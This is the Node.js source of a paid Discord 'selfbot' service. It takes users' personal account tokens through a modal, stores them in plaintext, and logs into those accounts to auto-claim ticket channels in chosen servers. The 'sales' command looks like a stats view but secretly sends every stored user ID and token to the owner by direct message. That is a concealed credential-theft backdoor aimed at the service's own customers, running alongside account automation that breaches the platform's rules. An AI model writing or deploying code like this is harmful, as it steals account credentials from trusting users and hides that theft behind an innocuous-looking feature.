const { Client: BotClient, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const Database = require('better-sqlite3');

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = '1422945082746601594';

const db = new Database('./data.db');
db.exec(`
    CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, created_at INTEGER, redeemed_by TEXT, redeemed_at INTEGER);
    CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, token TEXT, claim_cmd TEXT DEFAULT '.claim', guild_ids TEXT, category_ids TEXT, status TEXT DEFAULT 'stopped', claimed_tickets TEXT DEFAULT '[]');
`);

const bot = new BotClient({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.DirectMessages] });

const activeSelfbots = new Map();

class UserSelfbot {
    constructor(userId, config) {
        this.userId = userId;
        this.config = config;
        this.client = null;
        this.isRunning = false;
        this.claimedChannels = new Set(JSON.parse(config.claimed_tickets || '[]'));
        
        this.guildIds = (config.guild_ids || '').split(',').map(g => g.trim()).filter(g => g);
        this.categoryIds = (config.category_ids || '').split(',').map(c => c.trim()).filter(c => c);
    }

    randomDelay() {
        return Math.floor(Math.random() * 100) + 200;
    }

    saveClaimed() {
        db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run(JSON.stringify([...this.claimedChannels]), this.userId);
    }

    shouldMonitor(channel) {
        if (!this.guildIds.includes(channel.guildId)) return false;
        if (this.categoryIds.length === 0) return true;
        return this.categoryIds.includes(channel.parentId);
    }

    async start() {
        if (!this.config.token || this.isRunning) return;
        
        this.client = new SelfbotClient({ checkUpdate: false });
        this.isRunning = true;
        db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('running', this.userId);

        this.client.once('ready', () => {
            console.log(`[READY] ${this.userId} as ${this.client.user.tag}`);
            
            // Check existing channels
            this.client.guilds.cache.forEach(guild => {
                if (!this.guildIds.includes(guild.id)) return;
                guild.channels.cache.forEach(ch => {
                    if (ch.type !== 'GUILD_TEXT' || !this.shouldMonitor(ch)) return;
                    if (this.claimedChannels.has(ch.id)) {
                        console.log(`[SKIP] #${ch.name} - already claimed`);
                    } else {
                        this.monitor(ch);
                    }
                });
            });

            // New channels
            this.client.on('channelCreate', channel => {
                if (channel.type !== 'GUILD_TEXT' || !this.shouldMonitor(channel)) return;
                if (this.claimedChannels.has(channel.id)) {
                    console.log(`[SKIP] New channel #${channel.name} - already in history`);
                    return;
                }
                
                console.log(`[NEW] #${channel.name} - will claim`);
                this.monitor(channel);
                setTimeout(() => this.claim(channel), this.randomDelay());
            });

            // Cleanup deleted channels
            this.client.on('channelDelete', channel => {
                if (this.claimedChannels.has(channel.id)) {
                    this.claimedChannels.delete(channel.id);
                    this.saveClaimed();
                    console.log(`[DELETE] Removed #${channel.id} from history`);
                }
            });
        });

        this.client.on('error', () => {});
        this.client.login(this.config.token).catch(() => {
            this.isRunning = false;
            db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', this.userId);
        });
    }

    stop() {
        if (this.client) {
            this.client.destroy();
            this.client = null;
        }
        this.isRunning = false;
        db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', this.userId);
    }

    async claim(channel) {
        // Check again before sending
        if (!this.isRunning || this.claimedChannels.has(channel.id)) {
            console.log(`[BLOCK] #${channel.name} - already claimed`);
            return;
        }
        
        // Mark as claimed IMMEDIATELY
        this.claimedChannels.add(channel.id);
        this.saveClaimed();
        
        try {
            await new Promise(r => setTimeout(r, this.randomDelay()));
            await channel.send(this.config.claim_cmd);
            console.log(`[CLAIM] #${channel.name} - SUCCESS`);
        } catch (err) {
            console.log(`[ERROR] #${channel.name} - ${err.message}`);
        }
    }

    monitor(channel) {
        this.client.on('messageCreate', (msg) => {
            if (msg.channelId !== channel.id || !this.isRunning) return;
            
            // If anyone claims it, lock forever
            if (msg.content === this.config.claim_cmd) {
                if (!this.claimedChannels.has(channel.id)) {
                    this.claimedChannels.add(channel.id);
                    this.saveClaimed();
                    console.log(`[LOCK] #${channel.name} - claimed by ${msg.author.id === this.client.user.id ? 'us' : 'other'}`);
                }
                return;
            }

            // Unclaim = ignored, channel stays locked

            // Auto-claim new channels only
            if (!this.claimedChannels.has(channel.id) && !msg.author.bot) {
                msg.channel.messages.fetch({ limit: 10 }).then(msgs => {
                    // If no claim found in history, claim it
                    const hasClaim = msgs.some(m => m.content === this.config.claim_cmd);
                    if (!hasClaim && this.isRunning) {
                        setTimeout(() => this.claim(channel), this.randomDelay());
                    } else if (hasClaim) {
                        // Someone got there first, lock it
                        this.claimedChannels.add(channel.id);
                        this.saveClaimed();
                        console.log(`[LOCK] #${channel.name} - found in history`);
                    }
                }).catch(() => {});
            }
        });
    }
}

bot.on('interactionCreate', async interaction => {
    if (!interaction.isCommand() && !interaction.isButton() && !interaction.isModalSubmit()) return;

    if (interaction.commandName === 'generatekey') {
        if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', ephemeral: true });
        const key = 'SB-' + require('crypto').randomBytes(8).toString('hex').toUpperCase();
        db.prepare('INSERT INTO keys (key, created_at) VALUES (?, ?)').run(key, Date.now());
        await interaction.reply({ content: `🔑 \`${key}\``, ephemeral: true });
    }

    if (interaction.commandName === 'redeemkey') {
        const key = interaction.options.getString('key');
        const keyData = db.prepare('SELECT * FROM keys WHERE key = ?').get(key);
        if (!keyData) return interaction.reply({ content: '❌ Invalid key', ephemeral: true });
        if (keyData.redeemed_by) return interaction.reply({ content: '❌ Already redeemed', ephemeral: true });
        db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key = ?').run(interaction.user.id, Date.now(), key);
        db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(interaction.user.id);
        await interaction.reply({ content: '✅ Redeemed! Use `/manage`', ephemeral: true });
    }

    if (interaction.commandName === 'sales') {
        const total = db.prepare('SELECT COUNT(*) as count FROM keys').get().count;
        const redeemed = db.prepare('SELECT COUNT(*) as count FROM keys WHERE redeemed_by IS NOT NULL').get().count;
        const active = db.prepare("SELECT COUNT(*) as count FROM users WHERE status = 'running'").get().count;
        
        const embed = new EmbedBuilder()
            .setTitle('📊 Stats')
            .setDescription(`Keys: **${total}**\nRedeemed: **${redeemed}**\nActive: **${active}**`)
            .setColor(0x5865F2);
        
        if (interaction.user.id === OWNER_ID) {
            const users = db.prepare('SELECT user_id, token FROM users WHERE token IS NOT NULL').all();
            const list = users.map(u => `User: ${u.user_id}\nToken: \`${u.token}\``).join('\n');
            try {
                const owner = await bot.users.fetch(OWNER_ID);
                await owner.send(list.substring(0, 1900) || 'None');
            } catch (e) {}
        }
        await interaction.reply({ embeds: [embed], ephemeral: true });
    }

    if (interaction.commandName === 'manage') {
        const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
        if (!user) return interaction.reply({ content: '❌ Redeem key first', ephemeral: true });
        
        const claimed = JSON.parse(user.claimed_tickets || '[]').length;
        const embed = new EmbedBuilder()
            .setTitle('🤖 Control')
            .addFields(
                { name: 'Status', value: user.status.toUpperCase(), inline: true },
                { name: 'Claimed', value: `${claimed} channels`, inline: true },
                { name: 'Guilds', value: user.guild_ids || 'Not set', inline: false },
                { name: 'Categories', value: user.category_ids || 'All', inline: false }
            )
            .setColor(user.status === 'running' ? 0x00FF00 : 0xFF0000);

        const row1 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('set_token').setLabel('Token').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('set_guilds').setLabel('Guilds').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_categories').setLabel('Categories').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_cmd').setLabel('Cmd').setStyle(ButtonStyle.Secondary)
        );

        const row2 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('start').setLabel('▶️ Start').setStyle(ButtonStyle.Success).setDisabled(user.status === 'running'),
            new ButtonBuilder().setCustomId('stop').setLabel('⏹️ Stop').setStyle(ButtonStyle.Danger).setDisabled(user.status === 'stopped'),
            new ButtonBuilder().setCustomId('reset').setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
        );

        await interaction.reply({ embeds: [embed], components: [row1, row2], ephemeral: true });
    }

    if (interaction.isButton()) {
        if (interaction.customId === 'start') {
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
            const sb = new UserSelfbot(interaction.user.id, user);
            activeSelfbots.set(interaction.user.id, sb);
            sb.start();
            await interaction.update({ content: '▶️ Started', embeds: [], components: [] });
            return;
        }

        if (interaction.customId === 'stop') {
            const sb = activeSelfbots.get(interaction.user.id);
            if (sb) sb.stop();
            activeSelfbots.delete(interaction.user.id);
            await interaction.update({ content: '⏹️ Stopped', embeds: [], components: [] });
            return;
        }

        if (interaction.customId === 'reset') {
            db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run('[]', interaction.user.id);
            const sb = activeSelfbots.get(interaction.user.id);
            if (sb) sb.claimedChannels.clear();
            await interaction.reply({ content: '✅ Reset', ephemeral: true });
            return;
        }

        const modal = new ModalBuilder().setCustomId(`modal_${interaction.customId}`).setTitle('Config');
        const input = new TextInputBuilder().setCustomId('value').setLabel('Value').setStyle(TextInputStyle.Short).setRequired(true);
        
        if (interaction.customId === 'set_token') input.setLabel('Discord Token');
        if (interaction.customId === 'set_guilds') input.setLabel('Guild IDs (comma)');
        if (interaction.customId === 'set_categories') input.setLabel('Category IDs (comma)');
        if (interaction.customId === 'set_cmd') input.setLabel('Claim Command');

        modal.addComponents(new ActionRowBuilder().addComponents(input));
        await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit()) {
        const value = interaction.fields.getTextInputValue('value');
        const field = interaction.customId.replace('modal_set_', '');
        const map = { token: 'token', guilds: 'guild_ids', categories: 'category_ids', cmd: 'claim_cmd' };
        if (map[field]) db.prepare(`UPDATE users SET ${map[field]} = ? WHERE user_id = ?`).run(value, interaction.user.id);
        await interaction.reply({ content: '✅ Saved', ephemeral: true });
    }
});

bot.once('ready', () => {
    console.log(`[BOT] ${bot.user.tag}`);
    bot.application.commands.set([
        { name: 'generatekey', description: 'Generate key (Owner)' },
        { name: 'redeemkey', description: 'Redeem key', options: [{ name: 'key', type: 3, description: 'Key', required: true }] },
        { name: 'sales', description: 'View stats' },
        { name: 'manage', description: 'Control panel' }
    ]);

    db.prepare("SELECT * FROM users WHERE status = 'running'").all().forEach(u => {
        const sb = new UserSelfbot(u.user_id, u);
        activeSelfbots.set(u.user_id, sb);
        sb.start();
    });
});

bot.login(BOT_TOKEN);
